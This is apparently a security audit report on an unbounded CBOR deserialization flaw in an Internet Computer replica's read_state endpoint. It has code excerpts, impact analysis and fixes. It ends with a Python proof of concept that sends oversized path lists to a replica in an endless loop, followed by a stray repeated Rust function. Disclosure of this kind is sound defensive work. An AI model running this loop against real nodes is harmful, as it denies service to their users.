Audit Report

## Title
Unbounded CBOR Deserialization of `read_state` Paths Before Count Validation Enables Replica Memory Exhaustion - (File: `rs/http_endpoints/public/src/read_state.rs`)

## Summary
The `read_state` HTTP handler explicitly disables axum's body size limit via `DefaultBodyLimit::disable()` and fully deserializes the attacker-controlled `paths` field into heap memory before any path-count validation occurs. An unprivileged caller can send a crafted CBOR request containing millions of paths, forcing the replica to perform massive heap allocations before the `TooManyPathsError` rejection is issued, enabling sustained memory exhaustion on any directly-reachable replica node.

## Finding Description
The `build_router` method in `ReadStateServiceBuilder` registers the `read_state` handler with `DefaultBodyLimit::disable()`, removing the axum default body cap and overriding any global `max_request_size_bytes` limit applied at the router level:

```rust
// rs/http_endpoints/public/src/read_state.rs L187-193
Router::new().route(
    ReadStateService::route(version, target),
    axum::routing::post(read_state)
        .with_state(state)
        .layer(ServiceBuilder::new().layer(DefaultBodyLimit::disable())),
)
```

The handler's first parameter is `WithTimeout<Cbor<HttpRequestEnvelope<HttpReadStateContent>>>`. The custom `Cbor` extractor (defined in `rs/http_endpoints/public/src/common.rs` L160-184) reads the entire uncapped body via `Bytes::from_request` and immediately calls `serde_cbor::from_slice`, deserializing the full envelope — including `paths: Vec<Path>` — into heap memory with no count guard:

```rust
// rs/http_endpoints/public/src/read_state.rs L217
WithTimeout(Cbor(request)): WithTimeout<Cbor<HttpRequestEnvelope<HttpReadStateContent>>>,
```

`HttpReadState.paths` carries no bound:

```rust
// rs/types/types/src/messages/http.rs L231-238
pub struct HttpReadState {
    pub sender: Blob,
    pub paths: Vec<Path>,
    ...
}
```

Only after full deserialization does the code enter a `spawn_blocking` task and call `validator.validate_request(...)`, which is the first point where `validate_paths_width_and_depth` enforces `MAXIMUM_NUMBER_OF_PATHS = 1_000`:

```rust
// rs/validator/src/ingress_validation.rs L165, L178-184
validate_paths_width_and_depth(&request.content().paths)?;
...
fn validate_paths_width_and_depth(paths: &[Path]) -> Result<(), RequestValidationError> {
    if paths.len() > MAXIMUM_NUMBER_OF_PATHS {
        return Err(TooManyPaths { ... });
    }
```

The `verify_paths` and `sparse_labeled_tree_from_paths` operations are only reached after validation passes (i.e., for requests with ≤1,000 paths), so those secondary claims in the report are overstated. The primary exploit window is the unbounded deserialization of the `paths` vector before the count check.

The boundary node (`rs/boundary_node/ic_boundary/src/http/middleware/process.rs` L103-107) does enforce `MAX_REQUEST_BODY_SIZE` via `buffer_body_to_bytes`, but this protection only applies to requests routed through the boundary node. Replica nodes expose port 8080 directly and are reachable without going through the boundary node.

## Impact Explanation
An attacker sends repeated `read_state` requests with, e.g., 5 million single-byte-label paths (~15–20 MB body, no size limit). Each request forces the replica to allocate heap memory for 5 million `Path` objects and their `Label` contents before returning a `TooManyPathsError`. Sustained at modest request rates, this continuously pressures the replica heap, potentially causing OOM kills or severe memory pressure, denying service to legitimate users on that replica node. This matches the allowed High impact: **Application/platform-level DoS or subnet availability impact not based on raw volumetric DDoS** — the attack is a protocol-level resource amplification, not a bandwidth flood.

## Likelihood Explanation
The `/api/v2/canister/.../read_state` and `/api/v3/canister/.../read_state` endpoints are publicly reachable on any replica's port 8080. Anonymous senders (single zero byte) are accepted. No authentication, cycles, canister deployment, or special privileges are required. The attacker only needs to craft a CBOR payload and send it over HTTP to any replica's public port, bypassing the boundary node entirely.

## Recommendation
1. **Remove `DefaultBodyLimit::disable()`** from the `read_state` route and replace it with a bounded limit (e.g., `DefaultBodyLimit::max(5 * 1024 * 1024)`), consistent with the `max_request_size_bytes` default of 5 MB in `rs/config/src/http_handler.rs`.
2. **Add an early path-count check** immediately after CBOR deserialization (before or during `try_from` conversion), rejecting requests with more than `MAXIMUM_NUMBER_OF_PATHS` paths before allocating path structures.
3. **Address the boundary node TODO** in `ICRequestContent` (`rs/boundary_node/ic_boundary/src/http/middleware/process.rs` L28-43) by adding a bounded deserializer for the `paths` field analogous to the existing `check_method_name_length` guard.

## Proof of Concept
```python
import cbor2, requests

# 100,000 paths — 100x the allowed limit of 1,000
paths = [[b"t"]] * 100_000
envelope = {
    "content": {
        "request_type": "read_state",
        "sender": bytes([4]),  # anonymous principal
        "paths": paths,
        "ingress_expiry": 2**63 - 1,
    }
}
body = cbor2.dumps(envelope)
print(f"Body size: {len(body):,} bytes")

target = "http://<replica_ip>:8080/api/v2/canister/aaaaa-aa/read_state"
while True:
    requests.post(target, data=body,
                  headers={"Content-Type": "application/cbor"}, timeout=10)
```

Each request forces full deserialization of 100,000 `Path` objects before rejection. A local integration test can confirm the behavior by sending such a request to a PocketIC or local replica instance and observing that the response is `400 TooManyPaths` only after the full body has been read and deserialized. fn validate_paths_width_and_depth(paths: &[Path]) -> Result<(), RequestValidationError> {
    if paths.len() > MAXIMUM_NUMBER_OF_PATHS {
        return Err(TooManyPaths {
            maximum: MAXIMUM_NUMBER_OF_PATHS,
            length: paths.len(),
        });
    }
    for path in paths {
        if path.len() > MAXIMUM_NUMBER_OF_LABELS_PER_PATH {
            return Err(PathTooLong {
                maximum: MAXIMUM_NUMBER_OF_LABELS_PER_PATH,
                length: path.len(),
            });
        }
    }
    Ok(())
}
